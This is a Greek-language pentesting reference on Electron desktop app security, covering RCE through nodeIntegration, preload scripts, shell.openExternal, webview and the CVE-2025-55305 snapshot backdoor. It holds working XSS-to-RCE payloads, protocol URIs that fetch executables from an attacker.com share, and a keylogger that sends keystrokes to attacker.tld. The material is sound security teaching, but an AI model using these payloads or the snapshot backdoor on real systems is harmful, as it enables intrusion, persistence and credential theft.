# Electron Desktop Apps

{{#include ../../../banners/hacktricks-training.md}}

## Εισαγωγή

Ο Electron συνδυάζει ένα τοπικό backend (με **NodeJS**) και ένα frontend (**Chromium**), αν και στερείται ορισμένων μηχανισμών ασφάλειας των σύγχρονων περιηγητών.

Συνήθως μπορεί να βρείτε τον κώδικα μιας εφαρμογής Electron μέσα σε ένα αρχείο `.asar`. Για να αποκτήσετε τον κώδικα, πρέπει να το εξάγετε:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Στον πηγαίο κώδικα μιας Electron εφαρμογής, μέσα στο `packet.json`, μπορείτε να βρείτε καθορισμένο το αρχείο `main.js` όπου ορίζονται οι ρυθμίσεις ασφαλείας.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Το Electron έχει 2 τύπους διεργασιών:

- Κύρια Διεργασία (έχει πλήρη πρόσβαση στο NodeJS)
- Διεργασία Renderer (θα πρέπει να έχει περιορισμένη πρόσβαση στο NodeJS για λόγους ασφάλειας)

![](<../../../images/image (182).png>)

Μια **Διεργασία Renderer** θα είναι ένα παράθυρο του προγράμματος περιήγησης που φορτώνει ένα αρχείο:
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Οι ρυθμίσεις της **renderer process** μπορούν να **διαμορφωθούν** στην **main process** μέσα στο αρχείο main.js. Κάποιες από τις ρυθμίσεις θα **αποτρέψουν την Electron application να αποκτήσει RCE** ή άλλες ευπάθειες εάν οι **ρυθμίσεις είναι σωστά διαμορφωμένες**.

Η electron application **θα μπορούσε να αποκτήσει πρόσβαση στη συσκευή** μέσω των Node apis, παρόλο που μπορεί να διαμορφωθεί για να το αποτρέψει:

- **`nodeIntegration`** - is `off` by default. If on, allows to access node features from the renderer process.
- **`contextIsolation`** - is `on` by default. If off, main and renderer processes aren't isolated.
- **`preload`** - empty by default.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - is off by default. It will restrict the actions NodeJS can perform.
- Node Integration in Workers
- **`nodeIntegrationInSubframes`**- is `off` by default.
- If **`nodeIntegration`** is **enabled**, this would allow the use of **Node.js APIs** in web pages that are **loaded in iframes** within an Electron application.
- If **`nodeIntegration`** is **disabled**, then preloads will load in the iframe

Example of configuration:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Μερικά **RCE payloads** από [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Καταγραφή κίνησης

Τροποποιήστε τη ρύθμιση start-main και προσθέστε τη χρήση ενός proxy όπως:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Αν μπορείτε να εκτελέσετε τοπικά μια Electron App, είναι πιθανό να την κάνετε να εκτελέσει αυθαίρετο javascript code. Δείτε πώς στο:


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Εάν το **nodeIntegration** είναι ρυθμισμένο σε **on**, το JavaScript μιας web σελίδας μπορεί να χρησιμοποιήσει δυνατότητες του Node.js εύκολα απλά καλώντας το `require()`. Για παράδειγμα, ο τρόπος για να εκτελέσετε την εφαρμογή calc στα Windows είναι:
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Το script που υποδεικνύεται σε αυτή τη ρύθμιση είναι l**oaded before other scripts in the renderer**, οπότε έχει **unlimited access to Node APIs**:
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Επομένως, το script μπορεί να εξάγει node-features σε σελίδες:
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **If `contextIsolation` is on, this won't work**

## RCE: XSS + contextIsolation

Το _**contextIsolation**_ εισάγει τα **ξεχωριστά contexts ανάμεσα στα scripts της σελίδας web και στον εσωτερικό JavaScript κώδικα του Electron**, έτσι ώστε η εκτέλεση JavaScript του κάθε κώδικα να μην επηρεάζει τον άλλο. Αυτή είναι μια απαραίτητη λειτουργία για να εξαλειφθεί η πιθανότητα RCE.

Αν τα contexts δεν είναι απομονωμένα, ένας επιτιθέμενος μπορεί:

1. Εκτελέσει **αυθαίρετο JavaScript στον renderer** (XSS ή πλοήγηση σε εξωτερικούς ιστότοπους)
2. **Αντικαταστήσει μια built-in μέθοδο** που χρησιμοποιείται σε preload ή στον εσωτερικό κώδικα του Electron για να αποκτήσει έλεγχο
3. **Προκαλέσει** τη χρήση της **αντικαταστημένης συνάρτησης**
4. RCE?

Υπάρχουν 2 σημεία όπου ενσωματωμένες μέθοδοι μπορούν να αντικατασταθούν: Στον preload κώδικα ή στον εσωτερικό κώδικα του Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Bypass click event

Εάν υπάρχουν περιορισμοί όταν κάνεις κλικ σε έναν σύνδεσμο, μπορεί να καταφέρεις να τους παρακάμψεις **κάνoντας middle click** αντί για το κανονικό left click
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Για περισσότερες πληροφορίες σχετικά με αυτά τα παραδείγματα δείτε [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) και [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Κατά την ανάπτυξη μιας Electron desktop εφαρμογής, η σωστή ρύθμιση των `nodeIntegration` και `contextIsolation` είναι κρίσιμη. Έχει διαπιστωθεί ότι η **client-side remote code execution (RCE)** που στοχεύει preload scripts ή Electron's native code από τη main process αποτρέπεται αποτελεσματικά όταν αυτές οι ρυθμίσεις είναι ενεργές.

Όταν ένας χρήστης αλληλεπιδρά με συνδέσμους ή ανοίγει νέα παράθυρα, ενεργοποιούνται συγκεκριμένοι event listeners, οι οποίοι είναι κρίσιμοι για την ασφάλεια και τη λειτουργικότητα της εφαρμογής:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Αυτοί οι listeners είναι **υπερκαθορίζονται από την desktop εφαρμογή** για να υλοποιήσει τη δική της **επιχειρηματική λογική**. Η εφαρμογή αξιολογεί αν ένας πλοηγημένος σύνδεσμος πρέπει να ανοιχθεί εσωτερικά ή σε εξωτερικό web browser. Η απόφαση αυτή συνήθως λαμβάνεται μέσω μιας συνάρτησης, `openInternally`. Αν αυτή η συνάρτηση επιστρέψει `false`, σημαίνει ότι ο σύνδεσμος πρέπει να ανοίξει εξωτερικά, χρησιμοποιώντας τη συνάρτηση `shell.openExternal`.

**Εδώ είναι ένας απλουστευμένος ψευδοκώδικας:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Οι βέλτιστες πρακτικές ασφαλείας για το Electron JS συνιστούν να μην γίνεται αποδοχή μη αξιόπιστου περιεχομένου με τη συνάρτηση `openExternal`, καθώς αυτό μπορεί να οδηγήσει σε RCE μέσω διαφόρων πρωτοκόλλων. Τα λειτουργικά συστήματα υποστηρίζουν διαφορετικά πρωτόκολλα που μπορεί να προκαλέσουν RCE. Για λεπτομερή παραδείγματα και περαιτέρω επεξήγηση πάνω στο θέμα αυτό, ανατρέξτε σε [αυτόν τον πόρο](https://positive.security/blog/url-open-rce#windows-10-19042), ο οποίος περιλαμβάνει παραδείγματα πρωτοκόλλων των Windows ικανά να εκμεταλλευτούν αυτή την ευπάθεια.

Στο macos, η συνάρτηση `openExternal` μπορεί να εκμεταλλευτεί για την εκτέλεση αυθαίρετων εντολών, όπως στο `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Παραδείγματα εκμεταλλεύσεων πρωτοκόλλων των Windows περιλαμβάνουν:**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Αυτό το vuln μπορεί να βρεθεί στο **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

Το **webviewTag** είναι ένα **deprecated feature** που επιτρέπει τη χρήση του **NodeJS** στη **renderer process**, οπότε θα πρέπει να απενεργοποιηθεί καθώς επιτρέπει το φόρτωμα ενός script μέσα στο preload context όπως:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Συνεπώς, ένας επιτιθέμενος που καταφέρνει να φορτώσει μια αυθαίρετη σελίδα θα μπορούσε να χρησιμοποιήσει αυτό το tag για να **φορτώσει ένα αυθαίρετο preload script**.

Αυτό το preload script καταχρήστηκε τότε για να καλέσει μια **vulnerable IPC service (`skype-new-window`)** η οποία καλούσε **`shell.openExternal`** για να αποκτήσει RCE:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Ανάγνωση Εσωτερικών Αρχείων: XSS + contextIsolation

**Η απενεργοποίηση του `contextIsolation` επιτρέπει τη χρήση των tags `<webview>`, παρόμοια με `<iframe>`, για ανάγνωση και exfiltrating τοπικών αρχείων.** Ένα παράδειγμα που παρέχεται δείχνει πώς να εκμεταλλευτείτε αυτήν την ευπάθεια για να διαβάσετε τα περιεχόμενα εσωτερικών αρχείων:

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Επιπλέον, παρουσιάζεται άλλη μέθοδος για **ανάγνωση ενός εσωτερικού αρχείου**, που αναδεικνύει μια κρίσιμη ευπάθεια ανάγνωσης τοπικών αρχείων σε ένα Electron desktop app. Αυτή περιλαμβάνει την έγχυση ενός script για την εκμετάλλευση της εφαρμογής και exfiltrate data:
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE: XSS + Παλιό Chromium**

Εάν το **chromium** που χρησιμοποιείται από την εφαρμογή είναι **παλιό** και υπάρχουν **γνωστές** **vulnerabilities** σε αυτό, μπορεί να είναι δυνατό να **exploit it and obtain RCE through a XSS**.\
Μπορείτε να δείτε ένα παράδειγμα σε αυτό το **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

Υποθέτοντας ότι βρήκατε ένα XSS αλλά **δεν μπορείτε να trigger RCE ή να steal internal files**, μπορείτε να προσπαθήσετε να το χρησιμοποιήσετε για να **steal credentials via phishing**.

Πρώτα απ' όλα πρέπει να ξέρετε τι συμβαίνει όταν προσπαθείτε να ανοίξετε ένα νέο URL, εξετάζοντας τον JS κώδικα στο front-end:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
Η κλήση στη **`openInternally`** θα αποφασίσει εάν το **link** θα **opened** στο **desktop window**, καθώς είναι link που ανήκει στην πλατφόρμα, **or** αν θα ανοίξει στον **browser as a 3rd party resource**.

Σε περίπτωση που το **regex** που χρησιμοποιεί η συνάρτηση είναι **vulnerable to bypasses** (για παράδειγμα **not escaping the dots of subdomains**) ένας attacker θα μπορούσε να εκμεταλλευτεί το XSS για να **open a new window which** θα βρίσκεται στην υποδομή του attacker **asking for credentials** από τον χρήστη:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Πρωτόκολλο

Όπως αναφέρεται στο [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) οι σελίδες που τρέχουν σε **`file://`** έχουν μονομερή πρόσβαση σε κάθε αρχείο στον υπολογιστή σας, πράγμα που σημαίνει ότι προβλήματα **XSS μπορούν να χρησιμοποιηθούν για να φορτώσουν αυθαίρετα αρχεία** από τον υπολογιστή του χρήστη. Η χρήση ενός **προσαρμοσμένου πρωτοκόλλου** αποτρέπει τέτοια προβλήματα, αφού μπορείτε να περιορίσετε το πρωτόκολλο ώστε να εξυπηρετεί μόνο ένα συγκεκριμένο σύνολο αρχείων.

## Remote module

Το Electron Remote module επιτρέπει στα **renderer processes to access main process APIs**, διευκολύνοντας την επικοινωνία μέσα σε μια εφαρμογή Electron. Ωστόσο, η ενεργοποίηση αυτού του module εισάγει σημαντικούς κινδύνους ασφαλείας. Αυξάνει την επιφάνεια επίθεσης της εφαρμογής, καθιστώντας την πιο επιρρεπή σε ευπάθειες όπως το cross-site scripting (XSS).

> [!TIP]
> Παρόλο που το **remote** module εκθέτει ορισμένα APIs από το main στα renderer processes, δεν είναι απλό να προκύψει RCE απλώς από την κατάχρηση των components. Ωστόσο, τα components μπορεί να εκθέτουν ευαίσθητες πληροφορίες.

> [!WARNING]
> Πολλές εφαρμογές που εξακολουθούν να χρησιμοποιούν το remote module το κάνουν με τρόπο που **απαιτεί την ενεργοποίηση του NodeIntegration** στη renderer process, κάτι που αποτελεί **τεράστιο κίνδυνο για την ασφάλεια**.

Από το Electron 14, το `remote` module μπορεί να είναι ενεργοποιημένο με διάφορους τρόπους· λόγω θεμάτων ασφάλειας και απόδοσης, είναι **συνιστώμενο να μην το χρησιμοποιείτε**.

Για να το ενεργοποιήσετε, πρώτα χρειάζεται να **ενεργοποιηθεί στο main process**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Στη συνέχεια, η renderer process μπορεί να import αντικείμενα από το module ως εξής:
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
Το **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** αναφέρει μερικές ενδιαφέρουσες **λειτουργίες** που εκτίθενται από το αντικείμενο **`app`** του απομακρυσμένου module:

- **`app.relaunch([options])`**
- **Επανεκκινεί** την εφαρμογή **τερματίζοντας** την τρέχουσα διεργασία και **εκκινώντας** μία νέα. Χρήσιμο για **ενημερώσεις εφαρμογής** ή σημαντικές **αλλαγές κατάστασης**.
- **`app.setAppLogsPath([path])`**
- **Ορίζει** ή **δημιουργεί** έναν φάκελο για την αποθήκευση των **αρχείων καταγραφής της εφαρμογής**. Τα αρχεία καταγραφής μπορούν να **ανακτηθούν** ή να **τροποποιηθούν** χρησιμοποιώντας **`app.getPath()`** ή **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Καταχωρεί** το τρέχον εκτελέσιμο ως τον **προεπιλεγμένο χειριστή** για ένα συγκεκριμένο **πρωτόκολλο**. Μπορείτε να παρέχετε μια **προσαρμοσμένη διαδρομή** και **παραμέτρους** αν χρειάζεται.
- **`app.setUserTasks(tasks)`**
- **Προσθέτει** εργασίες στην **Tasks category** στο **Jump List** (στα Windows). Κάθε εργασία μπορεί να ελέγχει πώς η εφαρμογή **εκκινείται** ή ποιες **παραμέτρους** περνιούνται.
- **`app.importCertificate(options, callback)`**
- **Εισάγει** ένα **PKCS#12 certificate** στην **αποθήκη πιστοποιητικών** του συστήματος (μόνο Linux). Ένας **callback** μπορεί να χρησιμοποιηθεί για να χειριστεί το αποτέλεσμα.
- **`app.moveToApplicationsFolder([options])`**
- **Μετακινεί** την εφαρμογή στον **Applications folder** (σε macOS). Βοηθά να εξασφαλιστεί μια **τυπική εγκατάσταση** για χρήστες Mac.
- **`app.setJumpList(categories)`**
- **Ορίζει** ή **αφαιρεί** μια **custom Jump List** στα **Windows**. Μπορείτε να καθορίσετε **κατηγορίες** για να οργανώσετε πώς εμφανίζονται οι εργασίες στον χρήστη.
- **`app.setLoginItemSettings(settings)`**
- **Ρυθμίζει** ποια **εκτελέσιμα** εκκινούν κατά την **είσοδο** μαζί με τις **επιλογές** τους (μόνο macOS και Windows).

Παράδειγμα:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences module

Η **κύρια API** για την πρόσβαση στις προτιμήσεις συστήματος και την **εκπομπή συμβάντων συστήματος** στο Electron. Μέθοδοι όπως **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, και **setUserDefault** είναι όλες **μέρος αυτού** του module.

**Παράδειγμα χρήσης:**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Παρακολουθεί** για **native macOS notifications** χρησιμοποιώντας NSDistributedNotificationCenter.
* Πριν από το **macOS Catalina**, μπορούσατε να sniff **όλες** τις διανεμημένες ειδοποιήσεις περνώντας **nil** στο CFNotificationCenterAddObserver.
* Μετά το **Catalina / Big Sur**, οι sandboxed apps μπορούν ακόμα να **subscribe** σε **many events** (για παράδειγμα, **screen locks/unlocks**, **volume mounts**, **network activity**, κ.λπ.) εγγράφοντας ειδοποιήσεις **by name**.

### **getUserDefault / setUserDefault**

* **Interacts** με **NSUserDefaults**, που αποθηκεύει **application** ή **global** προτιμήσεις στο macOS.

* **getUserDefault** μπορεί να **retrieve** ευαίσθητες πληροφορίες, όπως **recent file locations** ή **user’s geographic location**.

* **setUserDefault** μπορεί να **modify** αυτές τις προτιμήσεις, επηρεάζοντας ενδεχομένως την **configuration** μιας εφαρμογής.

* Σε **παλαιότερες εκδόσεις του Electron** (πριν το v8.3.0), μόνο το **standard suite** του NSUserDefaults ήταν **accessible**.

## Shell.showItemInFolder

Αυτή η συνάρτηση δείχνει το δοθέν αρχείο σε έναν file manager, ο οποίος **could automatically execute the file**.

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Οι εφαρμογές Electron θα πρέπει να έχουν μια **Content Security Policy (CSP)** για να **prevent XSS attacks**. Η **CSP** είναι ένα **security standard** που βοηθά στο να **prevent** την **execution** του **untrusted code** στον browser.

Συνήθως **configured** στο αρχείο **`main.js`** ή στο πρότυπο **`index.html`** με την CSP μέσα σε ένα **meta tag**.

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## RCE: Webview CSP + postMessage trust + local file loading (VS Code 1.63)

Αυτή η πραγματική αλυσίδα επηρέασε το Visual Studio Code 1.63 (CVE-2021-43908) και δείχνει πώς ένα single markdown-driven XSS σε ένα webview μπορεί να κλιμακωθεί σε πλήρες RCE όταν το CSP, το postMessage και οι scheme handlers είναι misconfigured. Public PoC: https://github.com/Sudistark/vscode-rce-electrovolt

Επισκόπηση αλυσίδας επίθεσης
- Πρώτο XSS μέσω webview CSP: Το παραγόμενο CSP περιείχε `style-src 'self' 'unsafe-inline'`, επιτρέποντας inline/style-based injection σε ένα `vscode-webview://` context. Το payload beaconed στο `/stealID` για να exfiltrate το target webview’s extensionId.
- Κατασκευή του URL του target webview: Χρησιμοποιώντας το leaked ID για να χτίσουν `vscode-webview://<extensionId>/.../<publicUrl>`.
- Δεύτερο XSS μέσω εμπιστοσύνης στο postMessage: Το εξωτερικό webview trusted `window.postMessage` χωρίς αυστηρούς ελέγχους origin/type και φόρτωσε attacker HTML με `allowScripts: true`.
- Τοπικό φόρτωμα αρχείων μέσω rewriting scheme/path: Το payload επαναέγραψε `file:///...` σε `vscode-file://vscode-app/...` και αντάλλαξε `exploit.md` με `RCE.html`, εκμεταλλευόμενο αδύνατο έλεγχο διαδρομών για να φορτώσει ένα privileged local resource.
- RCE σε Node-enabled context: Το φορτωμένο HTML εκτελέστηκε με διαθέσιμες Node APIs, παρέχοντας εκτέλεση εντολών OS.

Example RCE primitive in the final context
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```
Related reading on postMessage trust issues:

{{#ref}}
../../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## **Εργαλεία**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) είναι ένα εργαλείο για τον εντοπισμό misconfigurations και security anti-patterns σε εφαρμογές που βασίζονται σε Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) είναι ένα open source VS Code plugin για εφαρμογές Electron που χρησιμοποιεί το Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) για τον έλεγχο ευάλωτων third-party βιβλιοθηκών
- [**Electro.ng**](https://electro.ng/): Πρέπει να το αγοράσετε

## Εργαστήρια

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) μπορείτε να βρείτε ένα lab για να εκμεταλλευτείτε ευάλωτες εφαρμογές Electron.

Κάποιες εντολές που θα σας βοηθήσουν με το εργαστήριο:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Τοπικό backdooring μέσω V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Οι εφαρμογές βασισμένες σε Electron και Chromium απο-σειριοποιούν ένα προκατασκευασμένο V8 heap snapshot κατά την εκκίνηση (v8_context_snapshot.bin, και προαιρετικά browser_v8_context_snapshot.bin) για να αρχικοποιήσουν κάθε V8 isolate (main, preload, renderer). Ιστορικά, τα integrity fuses του Electron δεν αντιμετώπιζαν αυτά τα snapshots ως εκτελέσιμο περιεχόμενο, οπότε διέφευγαν τόσο την επιβολή ακεραιότητας με fuse όσο και τους ελέγχους code-signing του OS. Ως αποτέλεσμα, η αντικατάσταση του snapshot σε μία εγκατάσταση εγγράψιμη από τον χρήστη παρείχε κρυφή, επίμονη εκτέλεση κώδικα μέσα στην εφαρμογή χωρίς να τροποποιηθούν τα υπογεγραμμένα binaries ή το ASAR.

Key points
- Integrity gap: Τα EnableEmbeddedAsarIntegrityValidation και OnlyLoadAppFromAsar επικυρώνουν το app JavaScript μέσα στο ASAR, αλλά δεν κάλυπταν τα V8 heap snapshots (CVE-2025-55305). Το Chromium παρόμοια δεν ελέγχει την ακεραιότητα των snapshots.
- Attack preconditions: Τοπική εγγραφή αρχείων στον κατάλογο εγκατάστασης της εφαρμογής. Αυτό είναι συνηθισμένο σε συστήματα όπου οι Electron apps ή οι Chromium browsers είναι εγκαταστημένοι σε διαδρομές εγγράψιμες από τον χρήστη (π.χ., %AppData%\Local στα Windows; /Applications με επιφυλάξεις σε macOS).
- Effect: Αξιόπιστη εκτέλεση κακόβουλου JavaScript σε οποιοδήποτε isolate με την υπεργραφή ενός συχνά χρησιμοποιούμενου builtin (ένα “gadget”), επιτρέποντας persistence και αποφυγή των ελέγχων code-signing.
- Affected surface: Electron apps (ακόμη και με fuses enabled) και Chromium-based browsers που φορτώνουν snapshots από διαδρομές εγγράψιμες από τον χρήστη.

Generating a malicious snapshot without building Chromium
- Use the prebuilt electron/mksnapshot to compile a payload JS into a snapshot and overwrite the application’s v8_context_snapshot.bin.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (εκτέλεση διαφορετικού κώδικα στο main έναντι του renderer)
- Main process detection: Τα Node-only globals όπως process.pid, process.binding(), ή process.dlopen είναι παρόντα στο main process isolate.
- Browser/renderer detection: Τα Browser-only globals όπως alert είναι διαθέσιμα όταν εκτελούνται σε περιβάλλον εγγράφου.

Παράδειγμα gadget που ελέγχει τις δυνατότητες του main-process Node μία φορά
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
PoC κλοπής δεδομένων σε Renderer/browser-context (π.χ. Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operator workflow
1) Write payload.js that clobbers a common builtin (e.g., Array.isArray) and optionally branches per isolate.
2) Build the snapshot without Chromium sources:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Overwrite the target application’s snapshot file(s):
- v8_context_snapshot.bin (always used)
- browser_v8_context_snapshot.bin (if the LoadBrowserProcessSpecificV8Snapshot fuse is used)
4) Launch the application; the gadget executes whenever the chosen builtin is used.

Notes and considerations
- Integrity/signature bypass: Τα αρχεία snapshot δεν αντιμετωπίζονται ως εγγενή εκτελέσιμα αρχεία από τους ελέγχους code-signing και (ιστορικά) δεν καλύπτονταν από τα Electron’s fuses ή τους μηχανισμούς ακεραιότητας του Chromium.
- Persistence: Η αντικατάσταση του snapshot σε μια εγκατάσταση όπου ο χρήστης έχει δικαιώματα εγγραφής συνήθως επιβιώνει από επανεκκινήσεις της εφαρμογής και μοιάζει σαν μια υπογεγραμμένη, νόμιμη εφαρμογή.
